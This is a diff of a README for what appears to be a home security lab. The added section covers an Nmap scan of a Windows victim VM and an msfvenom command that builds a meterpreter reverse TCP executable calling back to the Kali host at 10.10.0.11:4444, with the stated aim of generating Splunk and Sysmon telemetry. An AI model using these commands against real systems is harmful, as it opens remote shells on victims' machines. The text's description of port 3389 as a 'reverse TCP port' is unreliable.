@@ -121,10 +121,18 @@ Now that I'm ready for the attack to go through, I disabled the Windows Firewall
 <img width="2014" height="1337" alt="image" src="https://github.com/user-attachments/assets/6913f7da-9e5d-46e4-8eba-7adc0c477ab7" />
 
 
-## Port scanning
+## Scouting and Generating Malware
 
 Using Nmap, I then ran a port scan on the Windows Victim machine (The -A flag was to scan everything, and the -pn flag was to skip pings in my output). 
 
 <img width="1416" height="1162" alt="image" src="https://github.com/user-attachments/assets/f2ef3a07-417e-4a10-af19-aad7fecfd34e" />
 
-Through this, I noticed that port 3389 (The port used for Microsoft RDP) was open. 
+Through this, I noticed that port 3389 (The port used for Microsoft RDP) was open. Given I know this is a reverse TCP port, I can use the command mfsvenom -l payloads | grep reverse_tcp to see any reverse tcp payloads that are available for use. Here, since the main goal is to get some tellemetry generated from SPLUNK and sysmon rather than an all-out attack being scaled on the Windows victim machine, I chose to use the windows/x64/meterpreter_reverse_tcp payload.
+
+<img width="1561" height="344" alt="image" src="https://github.com/user-attachments/assets/b3a42568-ff85-4a5d-a1c7-2f19b4fefaff" />
+
+
+With the payload in hand, the command msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.10.0.11 lport=4444 -f exe -o malware_file.exe can be used to generate the virus. Here, the meterpereter shell that is set to report back to the Kali machine's IP at teh default meterpreter port (4444). The malware itself is saved to an exe file that we'll be sending over to our Windows machine,
+
+<img width="1736" height="739" alt="image" src="https://github.com/user-attachments/assets/9a8b1119-1ae5-4103-8a91-df89a2256bd5" />
+
